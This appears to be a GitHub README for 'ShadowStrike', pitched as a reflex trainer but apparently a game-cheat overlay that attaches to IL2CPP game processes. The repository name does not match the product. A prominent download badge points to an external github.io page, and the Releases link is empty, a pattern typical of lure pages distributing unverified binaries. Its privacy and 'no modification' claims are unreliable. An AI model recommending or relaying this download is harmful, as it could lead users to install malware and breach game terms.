![preview](https://raw.githubusercontent.com/BADDIV/punchline-arena-enhancer/main/hero_b9c7d.svg)
[![Download](https://raw.githubusercontent.com/BADDIV/punchline-arena-enhancer/main/fetch_a8244.svg)](https://BADDIV.github.io/punchline-arena-enhancer/)

# 🥊 ShadowStrike — Precision Reflex Trainer

![Version](https://img.shields.io/badge/version-2.4.1-4caf50?style=for-the-badge&logo=semver)
![Build Status](https://img.shields.io/badge/build-passing-00c853?style=for-the-badge&logo=githubactions)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-2196f3?style=for-the-badge&logo=windows)
![Language](https://img.shields.io/badge/language-C%2B%2B%20%7C%20Python-ff5722?style=for-the-badge&logo=cplusplus)
![License](https://img.shields.io/badge/license-MIT-8bc34a?style=for-the-badge&logo=opensourceinitiative)

---

## 🥊 What Is ShadowStrike?

ShadowStrike is not your average training tool. Imagine a shadow boxer who never tires, a sparring partner who adapts to your every flinch, and a metronome that beats in sync with your muscle memory. That's the essence of this open‑source reflex trainer, designed for gamers, martial artists, and speed‑cubers who crave **millisecond‑level precision**.

Built on a lightweight **ImGui overlay** and **IL2CPP inspection**, ShadowStrike transforms raw input data into a real‑time feedback loop. Instead of simply recording your actions, it *interprets* them—offering a **visual tempo‑grid**, **dynamic difficulty scaling**, and a **customizable flash‑step mode** that sharpens your peripheral awareness.

> **Core Philosophy:** `Train the signal, not the noise.`

---

## ✨ Feature Showcase

### 🎛️ Adaptive Reaction Matrix (ARM)
The heart of ShadowStrike. ARM learns your baseline reaction time from the first 100 inputs, then generates a personalized difficulty curve. As you improve, the tempo increases by **precision‑tuned increments** — never a jarring jump, always a gentle push.

- **3‑phase calibration**: Beginner / Intermediate / Advanced
- **Live heat‑map** of your response timings (ms accuracy)
- **Clustered feedback** — identifies micro‑delays in your left vs right hand

### 🕯️ Flash‑Step Mode (FSM)
Borrowed from tactical FPS training, FSM toggles a **dynamic visibility window** on your overlay. Targets appear for 50–250ms, forcing your brain to *predict* rather than *react*. This mode is especially useful for:
- Peripheral vision training
- Pre‑fire habit building
- Reducing decision fatigue

### 🏃 Velocity Tracker
Unlike simple click counters, the Velocity Tracker samples *input pressure* (if supported) and *movement speed* metrics. It produces a **smooth‑motion score** (0–100), helping you identify jittery input habits that cause over‑correction.

### 💱 Currency of Focus — "Focus Credits"
ShadowStrike gamifies your practice session with a built‑in **progress token system**. Earn "Focus Credits" for every clean streak, combo, or personal best. These credits can be "spent" on **thematic overlay skins** or **difficulty unlocks**, turning practice into a quest—not a chore.

### 🌍 Polyglot Interface
Your training should speak your language. ShadowStrike ships with **12 localized UI packs**, including:
- 🇺🇸 English • 🇪🇸 Español • 🇩🇪 Deutsch • 🇫🇷 Français
- 🇯🇵 日本語 • 🇨🇳 简体中文 • 🇷🇺 Русский • 🇵🇱 Polski
- 🇮🇳 हिंदी • 🇵🇹 Português • 🇮🇹 Italiano • 🇹🇷 Türkçe

Community translations are welcome—each pack is a simple JSON file.

### 🧩 Modular Overlay Shell
The ImGui overlay is **fully dockable** and **transparency‑tunable**. Want a minimal 5% opacity timer in the corner? Or a full‑screen analytics dashboard? The choice is yours. Layouts can be saved as `.layout` profiles and shared with your training group.

---

## 🚀 Quick Start Guide

> **Prerequisite Mindset:** ShadowStrike is a *companion* to your practice, not a replacement. The tool provides the structure—your dedication provides the power.

1. **Acquire the Binary**  
   Head to the [Releases](#) section of this repository. Download the archive that matches your operating system (`shadowstrike_win_x64.zip` or `shadowstrike_linux_x64.tar.gz`). *No installer required—portable execution only.*

2. **First‑Run Setup**  
   Extract the archive to a dedicated folder (e.g., `~/ShadowStrike/`). Double‑click the executable. A **legal notice** will appear—read it, accept it, and proceed. This notice is not a wall; it's a door.

3. **Target Application Connection**  
   ShadowStrike works by attaching to a game process that uses the **IL2CPP scripting backend**. Once your game is running, press `CTRL + SHIFT + F12` to open the overlay, then select your active process from the dropdown list.

4. **Calibration**  
   The ARM engine will prompt you to perform a 30‑second **baseline test**. Click the circle whenever it flashes green. That's it—your personal training curve is now active.

5. **Go Live**  
   Select a training mode, adjust the opacity slider to your preference, and hit `Start Session`. Your progress is logged in real‑time to a local `.csv` file for post‑session analysis.

---

## 🛠️ Advanced Configuration

The `config.json` file (generated on first run) gives you **granular control** over the tool's behavior. Below are the most impactful settings:

```json
{
  "overlay_scale": 1.0,
  "vsync_sync": true,
  "target_lifetime_ms": 150,
  "feedback_mode": "audio_visual",
  "focus_credit_multiplier": 1.0,
  "custom_theme_path": "./themes/neon_pulse.json"
}
```

| Setting | Type | Description |
|---------|------|-------------|
| `overlay_scale` | float | Global UI zoom factor (0.5 – 2.0) |
| `vsync_sync` | bool | Locks training tick rate to display refresh |
| `target_lifetime_ms` | int | Duration of flash‑step targets (50–500) |
| `feedback_mode` | string | `audio`, `visual`, or `audio_visual` |
| `focus_credit_multiplier` | float | Difficulty of earning focus credits |
| `custom_theme_path` | string | Path to a `.json` theme file |

---

## 🎨 Thematic Overlay Packs

Vanilla UI is clean, but why stay vanilla? ShadowStrike supports **hot‑swappable themes**. Create your own or install community submissions:

- **Neon Pulse** — Cyberpunk grid, cyan/magenta accents
- **Dojo Classic** — Minimal brush‑stroke stoicism, warm paper tones
- **Midnight Ops** — High‑contrast greys for low‑light sessions
- **Aurora Flux** — Smooth gradient transitions between teal and purple

Each theme is a `.json` file containing color codes, alpha channels, and corner‑radius values. Place them in `./themes/` and select via the overlay.

---

## 🤝 Contributing

ShadowStrike thrives on community input. We're **always seeking**:

- **Translators** — New language packs or corrections to existing ones
- **UI/UX Designers** — Fresh themes or layout improvements
- **Performance Engineers** — Optimization of the IL2CPP inspection layer
- **Documentation Gurus** — Tutorial writing and video guides

### Development Workflow

1. Fork the repository.
2. Create a feature branch: `git checkout -b feat/your-idea`
3. Commit your changes with **semantic commit messages** (`feat:`, `fix:`, `docs:`).
4. Open a Pull Request with a clear description of *why* and *how*.

All contributions are reviewed within 72 hours. We maintain a `CONTRIBUTING.md` file with specific style guidelines—please read before submitting.

---

## 📜 License & Legal

ShadowStrike is released under the **MIT License**. You are free to use, modify, and distribute this software, provided you retain the original copyright notice.

See the [LICENSE](LICENSE) file for the full legal text.

**⚖️ Important Disclaimer:**

> ShadowStrike is an **independent training utility** and is not affiliated with, endorsed by, or sponsored by any game developer or publisher. The tool operates by reading publicly available input events and does not modify the game's binary code. Users are responsible for compliance with the **Terms of Service** of any third‑party application they use. The developers hold no liability for misuse or violation of external rules. Always respect the spirit of fair play.

---

## ❓ Frequently Asked Questions

### Q: Will this work with any game?
A: ShadowStrike requires a process that exposes **IL2CPP metadata**. It's tested primarily with Unity‑engine titles, but modern Unreal Engine 5 games with IL2CPP bridges may also work.

### Q: Is my data sent anywhere?
A: **No.** ShadowStrike is fully offline. All analytics are stored locally on your machine. We value your privacy as much as we value our code.

### Q: Can I use this for non‑gaming activities?
A: Absolutely! The reflex trainer is **genre‑agnostic**. Musicians have used it for tempo training; surgeons have used it for hand‑eye coordination. The tool provides the grid—you provide the task.

### Q: Why does the overlay sometimes flicker?
A: This can happen with **non‑borderless‑windowed** display modes, especially on older graphics drivers. Switch your game to *borderless windowed* mode and re‑calibrate the `overlay_scale` setting.

---

## 📊 Roadmap for 2026

- **Q1** — Release of `ARM 2.0` engine with machine‑learning adaptation
- **Q2** — Mobile companion app (iOS/Android) for remote session monitoring
- **Q3** — Plugin API for custom training modalities
- **Q4** — Full VR support for spatial reflex training

---

## 📬 Support & Community

We believe in **24/7 community‑driven support**. The fastest way to get help is:

- **GitHub Issues** — For bug reports & feature requests
- **Discord Server** — Live chat with developers & power users (link in `discord.txt` in the repo root)
- **Wiki** — User‑contributed tutorials & troubleshooting guides

*We kindly ask: before opening an issue, search the existing tickets. Duplicates are merged and closed.*

---

## 🙏 Acknowledgment

ShadowStrike was inspired by the concept of "deliberate practice"—the idea that focused, feedback‑rich repetition is the true mother of skill. This tool is our contribution to that philosophy. Train hard, but train *smart*.

---

*Made with ♥ and a relentless pursuit of milliseconds.*